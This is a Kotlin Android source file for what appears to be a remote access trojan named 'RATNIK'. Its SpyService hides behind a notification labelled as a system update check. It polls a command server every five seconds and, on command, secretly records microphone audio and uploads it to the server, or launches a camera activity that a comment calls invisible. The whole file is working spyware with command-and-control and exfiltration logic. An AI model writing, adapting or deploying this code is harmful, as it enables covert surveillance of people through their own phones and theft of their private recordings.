package com.ratnik.app

import android.app.*
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

class SpyService : Service() {
    private val client = OkHttpClient.Builder().connectTimeout(15, TimeUnit.SECONDS).writeTimeout(15, TimeUnit.SECONDS).build()
    private val serverUrl = "http://127.0.0.1:8080" 

    override fun onCreate() {
        super.onCreate()
        val channelId = "ratnik_ch"
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(channelId, "System Update", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
            val notification = Notification.Builder(this, channelId)
                .setContentTitle("Проверка обновлений...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details).build()
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA)
            } else {
                startForeground(1, notification)
            }
        }
        
        Thread {
            while (true) {
                try {
                    val request = Request.Builder().url("$serverUrl/ping").build()
                    client.newCall(request).execute().use { response ->
                        val body = response.body?.string() ?: ""
                        if (body.contains("RECORD")) {
                            recordAudio()
                        } else if (body.contains("SNAPSHOT")) {
                            // Запуск невидимой камеры
                            val intent = Intent(applicationContext, CameraActivity::class.java)
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(intent)
                        }
                    }
                } catch (e: Exception) {
                    Log.e("RATNIK", "Ошибка пинга: ${e.message}")
                }
                Thread.sleep(5000)
            }
        }.start()
    }

    private fun recordAudio() {
        val file = File(cacheDir, "audio.m4a")
        var recorder: MediaRecorder? = null
        try {
            recorder = MediaRecorder()
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(file.absolutePath)
            recorder.prepare()
            recorder.start()
            Thread.sleep(10000)
            recorder.stop()
            recorder.release()
            uploadFile(file, "audio/m4a", "record.m4a")
        } catch (e: Exception) {
            Log.e("RATNIK", "Ошибка записи: ${e.message}")
            recorder?.release()
        }
    }

    private fun uploadFile(file: File, mimeType: String, fileName: String) {
        try {
            val requestBody = file.asRequestBody(mimeType.toMediaTypeOrNull())
            val multipartBody = MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("file", fileName, requestBody)
                .build()
                
            val request = Request.Builder()
                .url("$serverUrl/upload")
                .post(multipartBody)
                .build()
                
            client.newCall(request).execute().use { }
            file.delete()
        } catch (e: Exception) {
            Log.e("RATNIK", "Ошибка отправки: ${e.message}")
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY
    override fun onBind(intent: Intent?): IBinder? = null
}
